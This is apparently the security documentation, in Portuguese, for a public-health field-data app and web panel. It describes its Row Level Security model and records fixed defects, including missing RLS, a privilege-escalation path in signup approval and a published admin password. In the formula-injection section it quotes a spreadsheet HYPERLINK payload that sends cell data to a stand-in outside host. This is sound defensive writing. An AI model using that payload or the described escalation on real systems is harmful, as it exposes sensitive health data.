# Segurança

O sistema guarda nome, CPF, cartão do SUS, endereço, condição de saúde,
medicação, dado de gestante, de criança, e relato de violência doméstica e de
negligência. É **dado pessoal sensível** na definição do art. 5º, II da LGPD, e
o destino é uso por secretaria municipal de saúde.

Este documento descreve o modelo, e registra os defeitos encontrados e
corrigidos, porque saber onde o sistema já falhou é mais útil que uma lista de
boas práticas.

---

## O modelo, em uma frase

Quem decide o que cada pessoa pode ler e gravar é o **banco**, por Row Level
Security. O aplicativo e o painel não são a fronteira de segurança: os dois
falam com o servidor usando a chave `anon`, que é pública por desenho e vai
dentro do pacote publicado.

Isso tem uma consequência que orienta tudo o mais: **qualquer regra de acesso
que o cliente poderia contornar não é regra de acesso.** Validação na tela
serve para a pessoa não errar, não para impedir quem quer invadir.

---

## As camadas

### 1. Identidade

| Onde | Como |
|---|---|
| Aplicativo, uso offline | autenticação local no SQLite, hash com sal por `expo-crypto` |
| Aplicativo, sincronização | sessão do Supabase Auth, aberta no login quando há rede |
| Painel web | sessão do Supabase Auth, por cookie, renovada pelo middleware |

O aplicativo autentica duas vezes de propósito. A autenticação local é o que
permite trabalhar sem rede, que é a razão de o sistema existir. A sessão do
Supabase é o que permite gravar no servidor, porque as policies decidem por
`auth.uid()`.

Sem sessão, a sincronização **para antes de tentar** e avisa. Isso não é
elegância: a fila conta tentativas e marca o item como erro definitivo depois
de cinco. Rodando sem sessão, cinco ciclos transformariam a coleta de um dia
inteiro em erro permanente, por uma causa sem relação com o dado.

### 2. Autorização

Quatro papéis, iguais em todo o sistema e no CHECK de `agentes.role`:

| Papel | Alcance |
|---|---|
| `agente` | os próprios pacientes |
| `coordenador` | a própria unidade de saúde |
| `gerente` | tudo, mais a trilha de auditoria |
| `admin` | tudo, mais a gestão de usuários |

As policies usam funções auxiliares (`agente_papel()`, `agente_unidade()`,
`pode_ler_prontuario()`) declaradas `SECURITY DEFINER` com `search_path`
travado. Isso existe para quebrar a recursão de uma policy que precisa
consultar outra tabela protegida por RLS.

Os guardas de tela espelham as policies **de propósito**, e há um teste que
confere isso (`contratoPapeis.test.ts`). Guarda que não casa com a policy
produz o pior tipo de erro: a página abre e vem vazia, e quem usa conclui que
não há dado em vez de que não tem permissão.

### 3. Dado em repouso

- Senha: hash com sal, comparação em tempo constante.
- Campos de identificação no aparelho: **em texto puro no SQLite**. O módulo
  `utils/encryption.ts` tem `encryptField` e `encryptSensitiveFields`, mas
  nenhuma linha do aplicativo os chama. Medido por busca em todo o código:
  o que se usa de lá é só o hash de senha e a limpeza do cache de chave.

  Documentar isso como cifrado era falso, e falso sobre proteção de dado
  sensível é pior que a lacuna. O que de fato protege o arquivo hoje é a
  cifra de disco do próprio Android, que vem ligada desde o Android 10 e vale
  enquanto o aparelho está bloqueado.

  Ligar a cifra que está escrita **não** resolveria: é SHA-256 em modo
  contador sem MAC, feita à mão porque o `expo-crypto` não expõe AES, e cifra
  de fluxo sem autenticação é maleável. Além disso, cifrar `nome` e `cpf`
  quebraria a busca local do aplicativo, que é o que o agente usa em campo.
  A saída de verdade é SQLCipher, cifrando o banco inteiro: preserva a busca
  dentro do aplicativo e é AEAD de verdade. Custa dependência nativa e build
  de desenvolvimento, a mesma restrição da sincronização em segundo plano.
- Chave de cifra e token de sessão: SecureStore (Keychain no iOS, Keystore no
  Android).
- `senha_hash` é ilegível pelo cliente: o `GRANT` de `agentes` é coluna por
  coluna, e essa coluna fica de fora.
- Exclusão é lógica (`deleted_at`), não física.

Vale saber **por que o GRANT é coluna por coluna**: `REVOKE SELECT (coluna)`
não tem efeito quando existe `GRANT` na tabela inteira. O jeito que funciona é
revogar a tabela e conceder as colunas permitidas uma a uma.

### 4. Trilha

`audit_log` é append-only no servidor: tem policy de INSERT e de SELECT, e
`REVOKE UPDATE, DELETE` por cima, para nem o papel `authenticated` tentar
alterar linha de auditoria. A leitura é restrita a gerente e admin.

O registro de evento ainda é raro na prática. Ver [lgpd.md](lgpd.md).

---

## Defeitos encontrados e corrigidos

Cada um foi reproduzido num PostgreSQL com o schema, as migrações e as policies
reais, antes e depois da correção. A mensagem de erro citada é a que o banco
devolveu.

### Sete tabelas sem Row Level Security

`agentes`, `audit_log` e as cinco `prontuario_*` não tinham RLS. Com a chave
`anon`, que é pública, qualquer pessoa lia e gravava prontuário de saúde, CPF e
hash de senha.

Medido antes da correção: visitante sem login leu 2 prontuários de saúde e 4
agentes com CPF; um agente leu o paciente de outro; um coordenador leu outra
unidade.

Corrigido com RLS e policy em todas as tabelas, mais os `GRANT` coluna por
coluna em `agentes`. Suíte: `rodar-testes-rls.sh`, 22 verificações.

### Elevação de privilégio na aprovação de cadastro

As Server Actions `aprovarSolicitacao` e `rejeitarSolicitacao` recebiam o id do
aprovador **como parâmetro**, confiavam nele, e usavam o cliente de serviço,
que ignora o RLS. Não havia verificação de sessão nem de papel.

O caminho era direto e sem credencial: preencher o cadastro público escolhendo
cargo "gerente", chamar `aprovarSolicitacao` com o id da própria solicitação e
qualquer uuid como aprovador, e receber uma conta de gerente. O limite de taxa
não atrapalhava, porque contava por um valor que o atacante escolhia.

Corrigido: a identidade vem do cookie de sessão, o parâmetro foi removido da
assinatura, e o papel é conferido com a mesma regra da policy de auditoria.
Doze testes, conferidos contra o código vulnerável.

### Senha de administrador publicada

A senha do administrador criado na primeira execução era a constante
`Admin@2025`, escrita no repositório, numa tabela do README e impressa na tela
de configurações do aplicativo. O repositório é público.

Corrigido: sorteada por `sortearSenhaForte`, guardada no SecureStore, exibida
uma vez e apagável.

### Injeção de fórmula em planilha

A exportação de relatório escapava vírgula, aspas e quebra de linha, mas não o
`=` inicial. Excel e LibreOffice executam célula que começa com `=`, `+`, `-`,
`@`, tabulação ou retorno de carro, e as observações da visita são texto livre
digitado em campo.

Uma célula com `=HYPERLINK("http://fora.example/"&A1,"clique")` exfiltraria a
linha quando alguém da secretaria abrisse o arquivo. Corrigido no aplicativo e
no painel, com prefixo de apóstrofo, que a planilha trata como texto.

### Vulnerabilidade crítica no framework

O Next.js 15.5.20 tinha dois RCE críticos sem autenticação, um específico de
servidor Windows. Atualizado para 15.5.27, que fecha os doze avisos da linha.
O `axios` do aplicativo acumulava doze avisos, entre eles SSRF por
redirecionamento; atualizado para 1.20.0.

O CI passou a ter portão: `npm audit --omit=dev` tem que ficar em zero no
painel, e nenhuma crítica no aplicativo.

---

### A leitura auditada era contornável

`fn_ler_morador` grava quem abriu a ficha, mas a tabela `moradores` tinha
`SELECT` inteiro para `authenticated`. Qualquer usuário logado pedia `cpf`,
`cartao_sus` ou `doencas` direto ao PostgREST e lia sem deixar rastro, e a tela
da família do próprio painel fazia isso com `moradores(*)`.

Corrigido em 28/10/2026 com `GRANT` coluna por coluna, como em
`agentes.senha_hash`. As listas leem nome, idade e marcadores; o resto só sai
pela função auditada. A busca por documento virou
`fn_buscar_morador_por_documento`: comparação exata, para não servir de oráculo
de prefixo, registrada sem guardar o documento.

O teste de banco achou um efeito colateral antes de ir para produção: o
Postgres exige ler as colunas que um `INSERT ... ON CONFLICT DO UPDATE`
atualiza, e o aplicativo sincronizava morador com upsert. A mensagem foi
`permission denied for table moradores`. O aplicativo passou a gravar com
INSERT e, na retentativa, UPDATE pelo id. Suíte: `rodar-testes-colunas.sh`.

### Conta desativada continuava com acesso

`agentes.ativo` não era consultado por nenhuma policy. Desativar um agente o
tirava das listas, e a sessão aberta continuava lendo prontuário. Corrigido
com uma policy `RESTRICTIVE` por tabela de dado, que o Postgres soma com E às
policies que já existiam, sem reescrevê-las.

### Funções de painel falhavam abertas

As seis funções de indicadores são `SECURITY DEFINER` e escolhiam o alcance
pelo papel de quem chama. Papel nulo, de quem não tem login ou não tem
cadastro, não casava com nenhum `IF` e caía no ramo de gerente: quatro delas
devolviam os números da cidade inteira e o nome dos agentes para quem tivesse
só a chave pública. Também estavam sem `search_path` travado. Agora recusam sem
cadastro ativo, travam o `search_path` e não são executáveis por `anon`.
Suíte: `07-conta-ativa.sql`, dentro de `rodar-testes-colunas.sh`.

## O que continua em aberto

- **As tabelas de prontuário ainda são legíveis direto pela API**, dentro do
  RLS e sem registro. A saída é a mesma de `moradores`: leitura coluna a
  coluna, função auditada e troca do upsert do aplicativo nessas tabelas.
- **`braces`, `sprintf-js` e `node-forge` seguem vulneráveis** e sem versão
  corrigida publicada pelo mantenedor. São ferramenta de build, não entram no
  pacote entregue. `image-size` 2.x e `uuid` 11.x corrigiriam dois avisos, mas
  quebram o empacotamento do Metro, e isso foi medido: `TypeError: The "list"
  argument must be an instance of SharedArrayBuffer`.
- **O limite de taxa é em memória do processo.** Serve para o caso de um
  servidor; com mais de uma instância, cada uma conta separado.
- **Não há segundo fator** para o painel, que é onde se lê o prontuário de
  todos.

---

## Como reportar uma falha

Ver [SECURITY.md](../SECURITY.md).
